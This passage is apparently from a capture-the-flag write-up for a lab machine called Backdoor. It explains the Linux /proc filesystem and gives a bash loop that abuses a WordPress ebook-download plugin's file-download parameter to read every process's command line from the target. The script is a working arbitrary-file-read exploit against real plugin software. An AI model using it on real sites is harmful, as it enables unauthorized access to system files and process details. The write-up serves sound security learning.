_____

I’d like to get a list of the processes running on the system. I can take a look at `/proc`, which has a directory for each process id (pid) currently running

```bash
ls /proc
```

There’s also the `self` folder, which is a symbolic link to the pid of the current process.

```bash
ls -l /proc/self
```

In each numbered folder, the `cmdline` file has the command line user to run the process

```bash
cat /proc/self/cmdline | xxd
```

```bash
#!/bin/bash

for i in $(seq 1 50000); do

    path="/proc/${i}/cmdline"
    skip_start=$(( 3 * ${#path} + 1))
    skip_end=32

    res=$(curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=${path}ne -o- | tr '\000' ' ')
    output=$(echo $res | cut -c ${skip_start}- | rev | cut -c ${skip_end}- | rev)
    if [[ -n "$output" ]]; then
        echo "${i}: ${output}"
    fi

done
```
